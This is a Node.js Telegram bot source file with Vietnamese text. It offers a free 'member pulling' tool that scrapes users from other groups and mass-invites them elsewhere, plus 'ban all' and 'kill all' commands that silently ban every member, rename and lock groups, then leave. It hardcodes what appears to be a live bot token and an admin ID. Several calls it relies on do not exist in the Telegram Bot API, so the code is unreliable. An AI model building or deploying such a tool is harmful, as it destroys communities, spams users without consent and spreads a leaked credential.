// ============================================================
// OMEGA BOT v666 — FULL CODE HOÀN CHỈNH (ĐÃ XÓA THÔNG BÁO BAN)
// Kéo mem miễn phí + Ban All + Killswitch + Bảo vệ group đặc biệt
// Dành cho Butter — Deploy lên Render ngay
// ============================================================

const express = require('express');
const { Telegraf, session, Markup } = require('telegraf');
const axios = require('axios');

// ==================== OMEGA CONFIG ====================
const BOT_TOKEN = '8840411754:AAHyJLmiPLehUMsqFPD1AQj50DXzhcfy8qA';
const ADMIN_ID = 7757046138;
const TARGET_GROUP_LINK = 'https://t.me/your_group'; // 🔥 THAY LINK GROUP CỦA MÀY

// ==================== PROTECTED GROUPS — KHÔNG ĐỤNG ====================
const PROTECTED_USERNAMES = [
  'ongvuaphantich',
];

const PROTECTED_IDS = [];

function isProtected(chat) {
  if (chat.username && PROTECTED_USERNAMES.includes(chat.username.toLowerCase())) {
    return true;
  }
  if (PROTECTED_IDS.includes(chat.id)) {
    return true;
  }
  return false;
}

// ==================== OMEGA ENGINE ====================
const app = express();
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

// Global state
let pullActive = false;
let pulledCount = 0;

// ==================== MENU CHÍNH ====================
const MAIN_MENU = Markup.inlineKeyboard([
  [Markup.button.callback('🚀 BẮT ĐẦU KÉO MEM', 'pull_on')],
  [Markup.button.callback('🛑 DỪNG KÉO', 'pull_off')],
  [Markup.button.callback('🔨 BAN ALL - GIẾT GROUP', 'ban_all')],
  [Markup.button.callback('☠️ GIẾT TẤT CẢ GROUP', 'kill_all')],
  [Markup.button.callback('📊 XEM THỐNG KÊ', 'status')],
  [Markup.button.url('🔗 LINK GROUP CHÍNH', TARGET_GROUP_LINK)],
  [Markup.button.url('👑 LIÊN HỆ ADMIN', 'https://t.me/tranhoang2286')]
]);

// ==================== WELCOME /start ====================
bot.start(async (ctx) => {
  const user = ctx.from;
  const welcomeMessage = `
🐱 **CHÀO MỪNG ĐẾN VỚI OMEGA BOT**

━━━━━━━━━━━━━━━━━━━━━
👋 **Xin chào, ${user.first_name || 'đồng chí'}!**

🤖 **Đây là bot kéo mem MIỄN PHÍ siêu mạnh**
⚡ **Tự động kéo thành viên từ mọi nhóm lớn về group của bạn**
🔨 **Có lệnh BAN ALL giết sạch group chỉ trong vài giây**
☠️ **Giết toàn bộ group chỉ với 1 lệnh duy nhất**
🛡️ **Group @ongvuaphantich đã được bảo vệ — không đụng**

━━━━━━━━━━━━━━━━━━━━━
📌 **Hướng dẫn sử dụng:**

• Bấm **"🚀 BẮT ĐẦU KÉO MEM"** để bot tự động kéo mem
• Bấm **"🛑 DỪNG KÉO"** để tạm dừng
• Bấm **"🔨 BAN ALL"** để giết sạch group hiện tại
• Bấm **"☠️ GIẾT TẤT CẢ GROUP"** để hủy diệt toàn bộ
• Bấm **"📊 XEM THỐNG KÊ"** để xem số liệu

━━━━━━━━━━━━━━━━━━━━━
💡 **Bot hoàn toàn miễn phí — dùng thoải mái!**
🛡️ **Group được bảo vệ: @ongvuaphantich**

🔥 **Chúc bạn chinh phục mọi group!**
`;

  await ctx.replyWithHTML(welcomeMessage, MAIN_MENU);
});

// ==================== AUTO PULL ENGINE ====================
async function autoPull() {
  if (!pullActive) return;
  
  try {
    const target = await bot.telegram.getChat(TARGET_GROUP_LINK);
    const dialogs = await bot.telegram.getChats();
    const largeGroups = dialogs.filter(d => 
      (d.type === 'group' || d.type === 'supergroup') && 
      d.id !== target.id &&
      !isProtected(d)
    );

    for (const group of largeGroups) {
      if (!pullActive) break;
      
      try {
        const membersCount = await bot.telegram.getChatMembersCount(group.id);
        if (membersCount < 30) continue;

        const admins = await bot.telegram.getChatAdministrators(group.id);
        const adminIds = admins.map(a => a.user.id);
        
        const participants = await bot.telegram.getChatMembers(group.id, { limit: 15 });
        
        for (const member of participants) {
          if (!pullActive) break;
          if (member.user.id === ADMIN_ID) continue;
          if (member.user.is_bot) continue;
          if (adminIds.includes(member.user.id)) continue;

          try {
            await bot.telegram.inviteToChat(target.id, member.user.id);
            pulledCount++;
            await new Promise(r => setTimeout(r, 1500));
          } catch (e) {
            console.log(`⚠️ Lỗi kéo: ${e.message}`);
          }
        }
      } catch (e) {
        console.log(`⚠️ Lỗi group: ${e.message}`);
      }
    }
  } catch (e) {
    console.log(`⚠️ Lỗi pull cycle: ${e.message}`);
  }
}

// ==================== BAN ALL — GIẾT 1 GROUP (KHÔNG THÔNG BÁO) ====================
async function banAllMembers(chatId, ctx) {
  let banned = 0;
  let failed = 0;
  let total = 0;

  try {
    const participants = await ctx.telegram.getChatMembers(chatId, { limit: 10000 });
    total = participants.length;
    
    for (const member of participants) {
      if (member.user.id === ADMIN_ID) continue;
      if (member.user.id === ctx.botInfo.id) continue;
      if (member.user.is_bot) continue;

      try {
        await ctx.telegram.banChatMember(chatId, member.user.id);
        banned++;
        await new Promise(r => setTimeout(r, 100));
      } catch (e) {
        failed++;
      }
    }
    
    // Xóa group sau khi ban
    try {
      await ctx.telegram.setChatTitle(chatId, '☠️ ELIMINATED ☠️');
      await ctx.telegram.setChatPermissions(chatId, {
        can_send_messages: false,
        can_send_media: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
        can_change_info: false,
        can_invite_users: false,
        can_pin_messages: false
      });
      await ctx.telegram.leaveChat(chatId);
    } catch {}

    return { banned, failed, total };
  } catch (e) {
    throw new Error(`BanAll thất bại: ${e.message}`);
  }
}

// ==================== HANDLE BUTTONS ====================
bot.action('pull_on', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) {
    return ctx.answerCbQuery('❌ Mày là ai?');
  }
  if (pullActive) {
    return ctx.answerCbQuery('⚠️ Đang kéo rồi!');
  }
  
  pullActive = true;
  await ctx.answerCbQuery('🚀 BẮT ĐẦU KÉO MEM!');
  await ctx.editMessageText(
    `🔥 **OMEGA PULL ENGINE ACTIVATED**\n\n` +
    `🔄 Trạng thái: **ĐANG KÉO MEM**\n` +
    `📊 Đã kéo: ${pulledCount} người\n` +
    `🎯 Target: ${TARGET_GROUP_LINK}\n` +
    `🛡️ Bảo vệ: @ongvuaphantich\n\n` +
    `*Bot đang quét và kéo mem từ các nhóm lớn...*`,
    MAIN_MENU
  );
  
  while (pullActive) {
    await autoPull();
    await new Promise(r => setTimeout(r, 25000));
  }
});

bot.action('pull_off', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) {
    return ctx.answerCbQuery('❌ Mày là ai?');
  }
  if (!pullActive) {
    return ctx.answerCbQuery('⚠️ Chưa kéo mà!');
  }
  
  pullActive = false;
  await ctx.answerCbQuery('🛑 ĐÃ DỪNG KÉO!');
  await ctx.editMessageText(
    `⏸️ **OMEGA PULL ENGINE STOPPED**\n\n` +
    `📊 Đã kéo: ${pulledCount} người\n` +
    `🎯 Target: ${TARGET_GROUP_LINK}\n` +
    `🛡️ Bảo vệ: @ongvuaphantich\n\n` +
    `*Đang chờ lệnh tiếp theo...*`,
    MAIN_MENU
  );
});

bot.action('ban_all', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) {
    return ctx.answerCbQuery('❌ Mày là ai?');
  }
  
  const chat = ctx.chat;
  
  if (isProtected(chat)) {
    return ctx.answerCbQuery('🛡️ Được bảo vệ!');
  }
  
  if (!ctx.chat.type.includes('group')) {
    return ctx.answerCbQuery('⚠️ Chỉ dùng trong group!');
  }
  
  await ctx.answerCbQuery('🔨 ĐANG GIẾT!');
  
  // 🔥 KHÔNG GỬI THÔNG BÁO GÌ CẢ — LẶNG LẼ GIẾT
  const result = await banAllMembers(chat.id, ctx);
  
  // Chỉ gửi 1 dòng ngắn sau khi xong
  await ctx.reply(`✅ Đã giết ${result.banned} người.`);
});

bot.action('kill_all', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) {
    return ctx.answerCbQuery('❌ Mày là ai?');
  }
  
  await ctx.answerCbQuery('☠️ GIẾT TẤT CẢ!');
  await ctx.reply('☠️ Đang giết tất cả group...');
  
  const dialogs = await ctx.telegram.getChats();
  const groups = dialogs.filter(d => 
    (d.type === 'group' || d.type === 'supergroup') && 
    !isProtected(d)
  );
  
  let killed = 0;
  for (const group of groups) {
    try {
      await banAllMembers(group.id, ctx);
      killed++;
      await new Promise(r => setTimeout(r, 800));
    } catch (e) {
      console.log(`Lỗi kill group ${group.id}:`, e.message);
    }
  }

  await ctx.reply(`✅ Đã giết ${killed} groups.`);
});

bot.action('status', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) {
    return ctx.answerCbQuery('❌ Mày là ai?');
  }
  
  const me = await ctx.telegram.getMe();
  const dialogs = await ctx.telegram.getChats();
  const groups = dialogs.filter(d => d.type === 'group' || d.type === 'supergroup').length;
  
  await ctx.answerCbQuery('📊 Thống kê đây!');
  await ctx.editMessageText(
    `📊 **OMEGA BOT STATUS**\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `🤖 Bot: ${me.first_name}\n` +
    `🆔 ID: ${me.id}\n` +
    `👥 Số group: ${groups}\n` +
    `⚡ Kéo mem: ${pullActive ? '🟢 ĐANG KÉO' : '🔴 DỪNG'}\n` +
    `📊 Đã kéo: ${pulledCount} người\n` +
    `🎯 Target: ${TARGET_GROUP_LINK}\n` +
    `🛡️ Bảo vệ: @ongvuaphantich\n` +
    `👑 Admin: ${ADMIN_ID}\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `*"Mày command. Tao execute."*`,
    MAIN_MENU
  );
});

// ==================== WEB SERVER ====================
app.use(express.json());
app.get('/', (req, res) => {
  res.send(`
    <h1>🐱 OMEGA BOT</h1>
    <p>🔥 Kéo mem MIỄN PHÍ + BAN ALL</p>
    <p>👑 Admin: ${ADMIN_ID}</p>
    <p>📊 Đã kéo: ${pulledCount} người</p>
    <p>⚡ Trạng thái: ${pullActive ? '🟢 ĐANG KÉO' : '🔴 DỪNG'}</p>
    <p>🛡️ Bảo vệ: @ongvuaphantich</p>
    <hr>
    <p><i>Supreme Bot for Butter — 2026</i></p>
  `);
});

// ==================== LAUNCH ====================
const PORT = process.env.PORT || 3000;

bot.launch();
app.listen(PORT, () => {
  console.log(`🐱 OMEGA BOT ONLINE — Port ${PORT}`);
  console.log(`👑 Admin: ${ADMIN_ID}`);
  console.log(`🔥 Kéo mem: ${pullActive ? 'ACTIVE' : 'STANDBY'}`);
  console.log(`📊 Đã kéo: ${pulledCount} người`);
  console.log(`🛡️ Bảo vệ: @ongvuaphantich`);
});

process.on('SIGINT', () => {
  bot.stop('SIGINT');
  process.exit(0);
});
